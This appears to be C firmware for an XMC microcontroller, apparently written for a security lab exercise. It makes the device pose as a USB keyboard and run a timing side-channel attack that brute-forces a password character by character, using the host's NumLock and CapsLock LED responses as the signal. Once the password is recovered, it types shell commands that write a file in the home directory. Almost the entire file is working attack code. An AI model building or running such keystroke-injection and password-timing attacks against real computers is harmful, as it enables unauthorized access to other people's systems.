
#include "KeyboardHID.h"
#include "german_keyboardCodes.h"
#include <stdlib.h>

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0

#define SIZE_PASSWORD_CHARSET 84
#define TRIES_PER_CHAR 5
#define MAX_PW_CHAR 20

#define CAPS_LOCK 0x39

const char pwchars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!()-_+=~;:,.<>[]{}/?&$";
char *known_pw;

// 84 possible password characters
uint32_t time_measures[SIZE_PASSWORD_CHARSET] = {0};
uint8_t index_pwchar = 0;

uint32_t pw_verify_time = 0;
bool pw_correct = false;
bool ready_for_input = false;

enum my_state {WAIT, CD, WRITE_NAME, FINISHED};
enum my_state write_file_state = WAIT;

/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);

void map_char_to_HID_report(char c, USB_KeyboardReport_Data_t* report);
void empty_report(USB_KeyboardReport_Data_t* report);

// Handler for SysTick Event
void SysTick_Handler(void);

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();

	// Core Clock 120 MHz = 120e6 --> reload with 120e3 --> 1ms Period
    SysTick_Config(SystemCoreClock/1000);

	known_pw = (char *)malloc(1 * (sizeof(char)));

	// Wait until host has enumerated HID device
	for(int i = 0; i < 3e6; ++i)
		; 

	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
	static uint8_t characterSent = 0;
	static uint8_t index_to_send = 0;
	static uint8_t counter_tries = 1;
	static bool stop = false;
	static bool max_found = false;
	static int max = 0;
	static uint8_t max_index = 0;
	
	static uint8_t known_pw_length = 0;
	static uint8_t command_length = 0;
	static bool write_command1 = false;
	static bool write_command2 = false;
	// I haven't found out yet, how to disable NUMLOCK
	static char command1[] = "CD ~";
	static char command2[] = "ECHO \"mARTIN aCHTNER\" > 03637258";

		
	// Try each possible password character and measure time (in Process HID Report)
	if (index_pwchar < SIZE_PASSWORD_CHARSET && !pw_correct) {
		if(!pw_correct && ready_for_input) {
			// Set report to 0 if character has been sent
			if(characterSent) {
				empty_report(report); 
				characterSent = 0;				
			}
			// Send known password
			else if (index_to_send < known_pw_length){
				map_char_to_HID_report(known_pw[index_to_send], report);
				characterSent = 1;
				++index_to_send;
				
			}
			// Send char to try and Enter
			else {
				
				map_char_to_HID_report(pwchars[index_pwchar], report);
				report->KeyCode[1] = GERMAN_KEYBOARD_SC_ENTER;
				characterSent = 1;
				ready_for_input = false;
				pw_verify_time = 0;
				index_to_send = 0;
				++index_pwchar;				
			}	
		}
	// Repeat time measure TRIES_PER_CHAR times	
	} else if (counter_tries < TRIES_PER_CHAR && !pw_correct) {
		counter_tries++;
		index_pwchar = 0;
	// Find max index of time measures --> cooresponds to right pw character
	} else if (!max_found&& !pw_correct) {
		max = 0;		
		for (int i = 0; i < SIZE_PASSWORD_CHARSET; i++) {
			if(max < time_measures[i]) {
				max = time_measures[i];
				max_index = i;
			}
		}
		max_found = true;
		
	// ad pw char to known password
	}
	else if (max_found && !pw_correct) {

		// save extracted pw char
		known_pw_length++;
		known_pw = (char *) realloc(known_pw, known_pw_length);
		known_pw[known_pw_length-1] = pwchars[max_index];

		// restart pw tries
		counter_tries = 1;
		index_pwchar = 0;		

		// reset time measures
		for(int i = 0; i< SIZE_PASSWORD_CHARSET; i++)
			time_measures[i] = 0;

		max_found = false;
	}
	// pw hacked
	else if (pw_correct && !write_command1 && !write_command2) {
		switch (write_file_state) {
			case WAIT:
				pw_verify_time = 0;
				write_file_state = CD;
				break;
			case CD:
				if(pw_verify_time >= 1000) {					
					command_length = sizeof(command1);
					index_to_send = 0;
					write_file_state = WRITE_NAME;
					pw_verify_time = 0;
					write_command1 = true;					
				}
				break;
			case WRITE_NAME:
				if (pw_verify_time >= 1000) {					
					command_length = sizeof(command2);
					write_command2 = true;
					index_to_send = 0;
					write_file_state = FINISHED;
				}
				break;
			case FINISHED: break;
		}

	}

	else if(pw_correct && write_command1) {
		if (index_to_send < command_length) {
			if(characterSent) {
				empty_report(report); 
				characterSent = 0;				
			}
			// Send command
			else {
				map_char_to_HID_report(command1[index_to_send], report);
				characterSent = 1;
				++index_to_send;				
			}
		}
		else {
			write_command1 = false;
		}
	}

	else if(pw_correct && write_command2) {
		if (index_to_send < command_length) {
			if(characterSent) {
				reset_report; 
				characterSent = 0;				
			}
			// Send command
			else {
				map_char_to_HID_report(command2[index_to_send], report);
				characterSent = 1;
				++index_to_send;				
			}
		}
		else {
			write_command2 = false;
		}
	}
	
	return true;
}

// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

	// for edge detection of NUMLOCK Signal
	static bool prev_numlock = true;

	// Numlock signal on high
	if(*report & HID_KEYBOARD_LED_NUMLOCK && prev_numlock == true) {
		XMC_GPIO_SetOutputHigh(LED1);
	} 
	// Rising edge of numlock signal
	else if ((*report & HID_KEYBOARD_LED_NUMLOCK) && (prev_numlock == false)) {
		time_measures[index_pwchar-1] += pw_verify_time;
		ready_for_input = true;
		XMC_GPIO_SetOutputHigh(LED1);
	}
	// Falling edge numlock signal
	else if ((*report & HID_KEYBOARD_LED_NUMLOCK) == 0 && prev_numlock == true) {
		prev_numlock = false;		
		XMC_GPIO_SetOutputLow(LED1);
	} else if ((*report & HID_KEYBOARD_LED_NUMLOCK) == 0 && prev_numlock == false) {
		XMC_GPIO_SetOutputLow(LED1);
	}


	if(*report & HID_KEYBOARD_LED_CAPSLOCK) { 
		XMC_GPIO_SetOutputHigh(LED2);
		pw_correct = true;
	}
	else 
		XMC_GPIO_SetOutputLow(LED2);
}

void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}

// This function takes as input a character and sets the according values in the HID report struct
void map_char_to_HID_report(char c, USB_KeyboardReport_Data_t* report) {
	report->Reserved = 0;
	// No Command key pressed
	if ('a' <= c && c <= 'x') {
		report->Modifier = 0;
		// a is 97 in Ascci and 0x04 in german_keyboardCodes
		report->KeyCode[0] = c - ('a' - GERMAN_KEYBOARD_SC_A);

	}
	// No Command key pressed
	else if('1' <= c && c <= '9') {
		report->Modifier = 0;
		report->KeyCode[0] = c - ('1' - GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION);

	} 
	// Shift pressed
	else if ('A' <= c && c <= 'X'){
		report->Modifier = 2;
		report->KeyCode[0] = c - ('A' - GERMAN_KEYBOARD_SC_A);

	}
	else {
		switch (c) {
			case 'y': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_Y; break;
			case 'z': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_Z; break;
			case '-': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE; break;
			case '+': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE; break;
			case ',': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON; break;
			case '.': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_DOT_AND_COLON; break;
			case '<': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE; break;
			case '0': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE; break;
			case '\n': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER; break;
			case '\0': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER; break;
			case ' ': report->Modifier = 0; report->KeyCode[0] = GERMAN_KEYBOARD_SC_SPACE; break;
			case 'Y': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_Y; break;
			case 'Z': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_Z; break;
			case '!': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION; break;
			case '(': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET; break;
			case ')': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET; break;
			case '_': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE; break;
			case '=': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE; break;
			case ';': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON; break;
			case ':': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_DOT_AND_COLON; break;
			case '>': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE; break;
			case '/': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE; break;
			case '?': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH; break;
			case '&': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_6_AND_AMPERSAND; break;
			case '$': report->Modifier = 2; report->KeyCode[0] = GERMAN_KEYBOARD_SC_4_AND_DOLLAR; break;
			case '~': report->Modifier = 64; report->KeyCode[0] = GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE; break;
			case '[': report->Modifier = 64; report->KeyCode[0] = GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET; break;
			case ']': report->Modifier = 64; report->KeyCode[0] = GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET; break;
			case '{': report->Modifier = 64; report->KeyCode[0] = GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE; break;
			case '}': report->Modifier = 64; report->KeyCode[0] = GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE; break;
			
		}
	}	
	
}

void empty_report(USB_KeyboardReport_Data_t* report) {
	report->Modifier = 0; 
	report->Reserved = 0; 
	report->KeyCode[0] = 0;
	report->KeyCode[1] = 0;
	report->KeyCode[2] = 0;
	report->KeyCode[3] = 0;
	report->KeyCode[4] = 0;
	report->KeyCode[5] = 0;
	report->KeyCode[6] = 0;
}
// Handler for SysTick Event
void SysTick_Handler(void) {
	pw_verify_time++;
}